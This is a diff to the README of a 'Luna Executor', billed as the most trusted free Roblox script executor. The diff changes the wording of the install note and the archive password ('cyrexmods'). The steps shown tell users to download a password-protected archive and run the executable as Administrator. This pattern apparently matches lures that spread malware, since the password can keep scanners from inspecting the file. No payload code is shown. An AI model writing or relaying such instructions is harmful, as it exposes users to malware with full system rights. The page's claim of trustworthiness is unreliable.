@@ -15,10 +15,10 @@ The **🚀 Luna Executor** is the most trusted free Roblox script executor in 20
 </div>
 
 
-> **Follow the installation instruction:** Do not miss any step, that could cause troubles.
+> > **Please follow the installation guide below:** Make sure to complete every single step precisely to avoid any issues.
 
 1. **⬇️ Download** the tool from the button above.
-2. **📦 Extract** the archive (password-2026)
+2. **📦 Extract** the archive (password: cyrexmods)
 3. **🖱️ Run as Administrator** – right-click the executable and select *Run as Administrator*.
 4. **✅ Follow the setup wizard** – complete the installation.
 5. **🚀 Launch the Tool** – the main window appears.
